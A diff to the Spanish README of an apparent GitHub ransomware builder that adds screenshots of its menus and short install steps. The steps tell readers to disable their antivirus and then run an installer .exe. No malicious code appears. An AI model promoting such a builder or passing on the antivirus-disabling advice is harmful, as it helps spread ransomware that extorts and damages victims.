@@ -6,9 +6,40 @@
  como siempre esto no esta pensado para hacer daño a nadie (o si), usa esto bajo tu propia responsabilidad.
  
  menu principal en español:
- ![https://github.com/AnderMoralDiaz/slam-ransomware-builder/blob/main/principal%20esp.png?raw=true]
+  ![](https://github.com/AnderMoralDiaz/slam-ransomware-builder/blob/main/principal%20esp.png?raw=true)
 
  menu principal en ingles:
- ![https://github.com/AnderMoralDiaz/slam-ransomware-builder/blob/main/principal%20ing.png?raw=true]
+ ![](https://github.com/AnderMoralDiaz/slam-ransomware-builder/blob/main/principal%20ing.png?raw=true)
  
- ![Aquí la descripción de la imagen por si no carga](https://github.com/AnderMoralDiaz/slam-ransomware-builder/blob/main/principal%20ing.png?raw=true)
+ menu ajustes en español:
+  ![](https://github.com/AnderMoralDiaz/slam-ransomware-builder/blob/main/ajustes%20esp.png?raw=true)
+
+ menu ajustes en ingles:
+ ![](https://github.com/AnderMoralDiaz/slam-ransomware-builder/blob/main/ajustes%20ing.png?raw=true)
+ 
+ menu avanzado en español:
+  ![](https://github.com/AnderMoralDiaz/slam-ransomware-builder/blob/main/avanzado%20esp.png?raw=true)
+
+ menu avanzado pagina 2 en español:
+ ![](https://github.com/AnderMoralDiaz/slam-ransomware-builder/blob/main/avanzado%20esp%202.png?raw=true)
+ 
+ menu avanzado pagina 3 en español:
+ ![](https://github.com/AnderMoralDiaz/slam-ransomware-builder/blob/main/avanzado%20esp%203.png?raw=true)
+
+ menu avanzado en ingles:
+  ![](https://github.com/AnderMoralDiaz/slam-ransomware-builder/blob/main/avanzado%20ing.png?raw=true)
+
+ menu avanzado pagina 2 en ingles:
+ ![](https://github.com/AnderMoralDiaz/slam-ransomware-builder/blob/main/avanzado%20ing%202.png?raw=true)
+ 
+ menu avanzado pagina 3 en ingles:
+ ![](https://github.com/AnderMoralDiaz/slam-ransomware-builder/blob/main/avanzado%20ing%203.png?raw=true)
+ 
+ pasos:
+ - desactiva el antivirus
+ 
+ - descarga slam ransomware builder installer.exe
+
+- dale a instalar/install
+
+- LISTO!!!
